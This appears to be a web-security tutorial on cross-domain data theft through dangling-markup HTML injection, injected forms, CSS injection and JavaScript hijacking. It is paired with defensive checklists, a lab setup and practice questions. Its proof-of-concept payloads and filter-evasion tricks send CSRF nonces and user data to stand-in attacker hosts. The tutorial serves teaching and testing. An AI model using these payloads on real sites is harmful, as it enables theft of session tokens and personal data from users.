# **Capturing Data Cross-Domain**

### **Core Idea**

* **Same-Origin Policy (SOP)**

  * SOP is designed to block JavaScript on one origin from reading responses from another origin.
  * CSRF works *around* SOP by making a **request** but not reading the **response** — hence called a “one-way” attack.
* **But**: In some cases, clever HTML injection can bypass this limitation and make the browser **send part or all of a cross-domain response to the attacker** without breaking SOP directly.

---

## **Attack Category #1 — Capturing Data by Injecting HTML**


### **Scenario**

* Target site allows **limited HTML injection** (not full XSS).
* Example:

  * Email app that lets some HTML through in user-generated content.
  * Error pages that echo back user data in a “safe” format but allow certain tags.
* If attacker can inject *structural HTML elements* inside the page, they can:

  1. Make the browser treat sensitive HTML as part of a request to attacker.
  2. Trick browser into submitting sensitive fields to attacker’s domain.

---

### **Case 1 — Unclosed `<img>` Tag Exploit**

**Goal:** Steal hidden CSRF token from the HTML without running JavaScript.

**Mechanics:**

* Inject an `<img>` tag with:

  * `src` pointing to attacker’s domain
  * No closing quote or closing tag
* The browser treats *all following HTML* as part of the URL until it hits another matching quote.
* This “quote leak” makes the browser append actual sensitive page HTML to the URL.

---

**Example Vulnerable HTML After Injection:**

```html
[User Injection Here]
<form action="http://wahh-mail.com/forwardemail" method="POST">
<input type="hidden" name="nonce" value="2230313740821">
<input type="submit" value="Forward">
...
</form>
```

**Attacker Injection:**

```html
<img src='http://mdattacker.net/capture?html=
```

**What Happens:**

* The browser builds this request:

```
GET /capture?html=<form%20action=...
Host: mdattacker.net
```

* All the HTML between the injection point and the **next `'`** is sent as part of the URL.
* This includes the **`nonce`** CSRF token and any other form fields.

---

**Why It Works:**

* SOP doesn’t stop the *browser* from requesting resources cross-domain.
* It only stops *JavaScript* from reading the response.
* Here, we don’t care about reading the attacker’s own response — we just need the **request** to contain the victim’s data.

---

### **Case 2 — Nested `<form>` Tag Exploit**

**Goal:** Capture form data when the victim submits a legitimate form.

**Mechanics:**

* Inject a new `<form>` element that points to the attacker’s server.
* Browsers ignore nested forms — instead, **all fields belong to the first form tag** in source order.
* If attacker’s injected form tag appears before the real one, form submission sends data to attacker.

---

**Injection Example:**

```html
<form action="http://mdattacker.net/capture" method="POST">
```

**Resulting Browser Behavior:**

* Victim clicks “Forward” →
  Browser sends **all** parameters (including anti-CSRF token) to `mdattacker.net`.

**Captured Request:**

```
POST /capture HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
Host: mdattacker.net

nonce=2230313740821&...
```

---

**Pros & Cons**

* ✅ Uses only well-formed HTML — more likely to pass “safe HTML” filters.
* ❌ Requires victim to **manually submit** the form (user interaction needed).

---

## **Advanced Red-Team Notes**

---

### **Filter Evasion Tricks**

If HTML filtering is in place:

* Try **case variations**: `<IMG>` instead of `<img>`
* Use **protocol-relative URLs**: `src='//attacker.com/...`
* Use **tag smuggling**:

  ```html
  <img src='//attacker.com/cap?d=<x><y>
  ```

  where `<x>` and `<y>` are allowed harmless tags but break parsing predictably.

---

### **Combining with Other Bugs**

* If you can cause the victim to auto-submit the form (`<input type=submit autofocus>` or CSS clickjacking), you remove the need for manual interaction.
* Combine with **Stored HTML Injection** in persistent areas (e.g., profile signature) to increase exposure.
* Combine with **email preview attacks** to capture tokens from authenticated users opening attacker-sent mail.

---

### **PoC Payload Template — Case 1**

```html
<img src='https://evil.com/grab?dump=
```

* Place where HTML with sensitive fields follows quickly after injection.
* Ensure **no quote or tag closure** until after the sensitive fields.

---

### **PoC Payload Template — Case 2**

```html
<form action="https://evil.com/dump" method="POST">
```

* Inject just before the legit form tag appears.
* Victim’s legitimate click sends data cross-domain.

---

## Attack #2 - Capturing Data by Injecting CSS

### **Scenario**

When an application allows **plain text** (no `<`/`>`) that looks harmless, an attacker can craft that text so that **the browser will interpret the whole page as CSS** when the page is included as a stylesheet on the attacker’s site. Browsers (notably older IE) will parse CSS values that bleed into the rest of the response, pulling sensitive HTML (e.g., hidden CSRF tokens) into a CSS property value. The attacker then reads that property via DOM/CSS APIs and exfiltrates it. This bypasses SOP in a practical sense because the browser itself carries the victim’s data into the attacker’s context.

---

### Why this is possible (mechanics)

1. **Server returns HTML** containing attacker-controlled plain text (no `<`/`>`).
2. **Attacker includes that HTML URL as a CSS stylesheet** in their page:

   ```html
   <link rel="stylesheet" href="https://victim.example.com/inbox" type="text/css">
   ```
3. Some browsers will treat that response as CSS. If the attacker’s injected text starts a CSS property with an unclosed string (e.g., `font-family:'`), the browser will continue the string across the rest of the HTML response until it finds the closing quote — effectively swallowing hidden fields and other HTML into the CSS property value.
4. The attack page then queries the computed style (or currentStyle in IE) to read the poisoned property, extracts the sensitive data, and sends it back to the attacker (e.g., via an `<img>` GET).

Key point: **this uses no script inside victim site** — it abuses how browsers parse linked stylesheets combined with permissive server echoing of user text.

---

### Example

#### **Victim Page**

```html
<td>{}*{font-family:'</td>
...
<form action="http://wahh-mail.com/forwardemail" method="POST">
  <input type="hidden" name="nonce" value="2230313740821">
  <input type="submit" value="Forward">
</form>
...
<script>var _StatsTrackerId='AAE78F27CB3210D';</script>
```

#### **Attacker injects** (subject line)

```
{}*{font-family:'
```

— this contains `{}*{font-family:'` **no `<` or `>`**, so many filters let it through.

#### **Attacker page (PoC)**

```html
<link rel="stylesheet" href="https://wahh-mail.com/inbox" type="text/css">
<script>
  // IE: document.body.currentStyle; modern: getComputedStyle
  var family = document.body.currentStyle.fontFamily;
  document.write('<img src="http://mdattacker.net/capture?' + escape(family) + '">');
</script>
```

**Browser behavior:**

* Fetch `https://wahh-mail.com/inbox` as CSS.
* CSS parser treats `font-family:'` then consumes everything up to the next single quote — which happens later in the page (in the victim's script string), so the `font-family` value becomes a huge chunk of HTML including the hidden nonce.
* Attacker’s script reads that computed style and exfiltrates it.

**Result:** attacker obtains the CSRF nonce and can launch a subsequent CSRF or other attack.

---

### Why some browsers are vulnerable and others not

* Vulnerability depends on **how the browser parses content declared as CSS** when it actually receives HTML. Historically IE accepted such content and allowed CSS parsing across HTML content; many modern browsers tightened parsing behavior to block this class of attack.
* **Reality for an assessor:** don’t assume all clients are safe — old or misconfigured clients (embedded browsers, old IE variants, some webviews) can remain exploitable.

---

### Variations & Improvements

* Use different CSS properties (e.g., `background`, `font-family`, `content`) to maximize chance of success across browsers.
* If the injected text can avoid quotes and rely on semicolon-terminated CSS, sometimes that works too — but unclosed-quote trick is most reliable for multi-line capture.
* If the application encodes quotes differently, adapt injection (single vs double quote) to match parsing.
* Combine with social engineering (victim clicks attacker link while authenticated) or with email previews to maximize reach.

---

### Practical Defensive Checklist 

1. **Never allow untrusted user input to be reflected into responses without sanitization** — even text-only fields. Treat text content as untrusted.
2. **Filter/encode characters that can break parsing contexts** (quotes, `{`, `}`, `:`, `;`) when you must echo user input into HTML.
3. **Avoid emitting sensitive tokens into HTML** where they can appear in contexts that might be parsed by other interpreters (CSS, URLs). Prefer server-side session validation and nonces that are not reflected.
4. **Use strict Content-Type headers**: if an endpoint is HTML, it should declare `Content-Type: text/html; charset=UTF-8`. But note: browsers sometimes ignore content-type inconsistencies — so don’t rely on it as only defense.
5. **CSP** can help by disallowing unauthorized stylesheet loads; but CSP is defense-in-depth, not a single fix.
6. **Test on legacy clients** and webviews (mobile apps, older IE) — real-world exposure often comes from old agents.
7. **Avoid putting tokens in the page markup at all** where possible — use double-submit or SameSite cookies and re-auth for critical actions.

---

### Lab Setup (safe, repeatable)

1. **Victim app** (simple web server):

   * Page `/inbox` that echoes a `subject` parameter into the body with **no `<`/`>`** filtering (simulate poor filter).
   * Hidden field: `<input type="hidden" name="nonce" value="SECRET_TOKEN">`.
2. **Attacker page**:

   * `link rel="stylesheet"` pointing to `https://victim.local/inbox?subject={INJECT}`.
   * Script that reads `getComputedStyle(document.body).fontFamily` (or `currentStyle` in IE emulation) and reports via an `<img>` to attacker server.
3. **Run old/modern browsers**:

   * Test in IE emulation (if possible) and in a couple modern browsers to observe behavior differences.
4. **Goals**:

   * Confirm whether the victim text is parsed as CSS by the browser.
   * Extract the nonce and show exfiltration to attacker log.

**Note:** Always do this in a local lab or isolated environment. Never run PoC against production without authorization.

---

### Quick PoC (lab) — attacker HTML (modernized)

```html
<!doctype html>
<html>
<head>
  <link rel="stylesheet" href="http://victim.local/inbox?subject=%7B%7D*%7Bfont-family:'" type="text/css">
</head>
<body>
<script>
  // Fallbacks for different browsers
  function readProp() {
    try {
      var val = window.getComputedStyle(document.body).getPropertyValue('font-family');
      if(!val && document.body.currentStyle) val = document.body.currentStyle.fontFamily;
      return val || '';
    } catch(e) { return ''; }
  }
  var leaked = readProp();
  if(leaked) {
    var i = new Image();
    i.src = 'http://attacker.local/capture?data=' + encodeURIComponent(leaked);
  } else {
    console.log('No leakage observed in this browser.');
  }
</script>
</body>
</html>
```

---

### Practical detection & remediation steps for testers

* **Test vectors**: supply text inputs that begin CSS properties (e.g. `font-family:'`) and monitor whether those pages when included as stylesheets leak content.
* **Scan for reflected user text** that is echoed near sensitive fields (hidden inputs, tokens, emails).
* **Try including the page as a stylesheet** from a controlled page and inspect computed styles.
* **Test old user agents / webviews** — many enterprise apps, intranet, or mobile apps use older engines.

---

### Short checklist for bug reports (what to include)

* Exact injected string (e.g., `{ }*{font-family:'`)
* The vulnerable endpoint URL and the parameter used
* Browser(s) where exploit works (names & versions; if IE only, state that)
* Steps to reproduce (attacker page code, victim prerequisites)
* PoC: attacker HTML file that demonstrates extraction
* Suggested remediation (remove reflection, encode special chars, do not place tokens in reflected HTML)

---

### Practice questions (5)

1. Why does injecting `font-family:'` allow an attacker to capture content across subsequent HTML? Explain the parser behavior that makes this possible.
2. How would you test whether a given endpoint is vulnerable to CSS-based data extraction from a modern browser and from IE? Outline the steps and test lines.
3. What server-side protections prevent this attack even if an endpoint echoes user-submitted text into an HTML response?
4. How could an attacker combine this CSS leakage with CSRF or clickjacking to escalate impact? Give a short attack chain.
5. Why is relying solely on Content-Type headers insufficient to prevent this attack in practice?

---

## Attack #3 - **JavaScript Hijacking**

### **Scenario**

JavaScript hijacking is a way for an attacker to *read sensitive data cross-domain* by exploiting how modern web apps dynamically load scripts. It turns a normal CSRF-like “one-way” attack (you can send requests but can’t see responses) into a **limited “two-way” attack** — where the attacker also *gets the response data*.

This is possible because:

1. **Same-Origin Policy loophole:** Browsers let you `<script>` include code from *any* domain. That code executes in the **context of your page**.
2. If that script contains sensitive **user-specific data**, and the attacker controls the function that processes it, they can steal the info.
3. AJAX-heavy (“Web 2.0”) apps often return user data directly as executable JavaScript or JSON arrays — this is the goldmine.

---

### **1. Function Callback Hijacking**

#### **Scenario:**

A profile page dynamically loads user info like this:

```html
<script src="https://mdsec.net/auth/420/YourDetailsJson.ashx"></script>
```

**Server Response:**
Instead of raw HTML, the server sends a JavaScript *function call* with sensitive data inside:

```javascript
showUserInfo(
  [
    ['Name', 'Matthew Adamson'],
    ['Username', 'adammatt'],
    ['Password', '4nl1ub3'],
    ['Uid', '88'],
    ['Role', 'User']
  ]
);
```

#### **Why It’s Vulnerable:**

* The browser doesn’t care where the script came from — it runs it.
* If the attacker defines `showUserInfo()` **on their own site**, and then includes this script, your browser will execute it with your data while you’re logged in.

#### **Attack PoC:**

```html
<script>
  function showUserInfo(x) {
    // Attacker’s capture function
    fetch('https://attacker.com/log', {
      method: 'POST',
      body: JSON.stringify(x)
    });
  }
</script>
<script src="https://mdsec.net/auth/420/YourDetailsJson.ashx"></script>
```

**Result:** The victim’s data is sent to the attacker’s server.

---

### **2. JSON Array Hijacking (Old Browsers)**

#### **Scenario:**

Server just returns JSON (not wrapped in a function):

```json
[
  ["Name", "Matthew Adamson"],
  ["Username", "adammatt"],
  ["Password", "4nl1ub3"],
  ["Uid", "88"],
  ["Role", "User"]
]
```

**Old Trick:**
Older Firefox allowed overriding `Array()` behavior. The attacker could hook into array creation:

```html
<script>
function capture(val) {
  console.log("Captured:", val);
}

function Array() {
  for (var i = 0; i < 5; i++) {
    this[i] setter = capture; // Trigger capture on assignment
  }
}
</script>
<script src="https://mdsec.net/auth/409/YourDetailsJson.ashx"></script>
```

#### **Why It Worked:**

* When the JSON loaded, Firefox internally called `new Array(...)`.
* Attacker’s malicious `Array()` intercepted each assignment.
* **Note:** Patched in modern browsers — only works in older Firefox (\<v2.0).

---

### **3. Variable Assignment Hijacking**

#### **Scenario:**

App embeds sensitive tokens directly in dynamic scripts:

```javascript
var nonce = '222230313740821';
```

#### **Attack PoC:**

```html
<script src="https://wahh-network.com/status"></script>
<script>
  alert(nonce); // Token available globally
</script>
```

**Variant:** If token is inside a function:

```javascript
function setStatus(status) {
  nonce = '222230313740821';
}
```

Attacker calls it after loading the script:

```html
<script src="https://wahh-network.com/status"></script>
<script>
  setStatus('test');
  alert(nonce);
</script>
```

---

### **4. E4X Hijacking (Firefox Legacy)**

#### **What It Is:**

E4X (ECMAScript for XML) allowed JavaScript to natively handle XML. Older Firefox let XML inside `<script>` be processed *and* execute JS inside `{...}` blocks.

#### **Example:**

```javascript
var foo = <bar>{alert('hi')}</bar>;
```

#### **Vulnerability:**

* HTML that doubles as valid XML could be included cross-domain.
* If it had `{...}` blocks containing sensitive data or token assignment, attacker could run it in their domain and capture the values.

**Status:** Fixed in modern browsers — but shows how **new language features can reintroduce old holes**.

---

### **Key Preconditions for Exploitation**

* Target returns **dynamic JavaScript** with sensitive data (user info, tokens, etc.).
* Data is accessible without authentication **beyond the victim’s active session**.
* Attacker can **predict or discover** the endpoint.

---

### **Defenses**

1. **Treat dynamic script responses like sensitive API calls** — require authentication and CSRF tokens.
2. **Use XMLHttpRequest/`fetch()` instead of `<script>` includes** to load internal JS. This allows:

   * POST-only access (script tags can’t POST).
   * Pre-processing responses before executing.
3. **Break automatic execution**:

   * Add something invalid at the start (e.g., `for(;;);`) and strip it client-side before eval.
4. **Never embed sensitive data directly in JavaScript variables** — serve via authenticated JSON API.

---
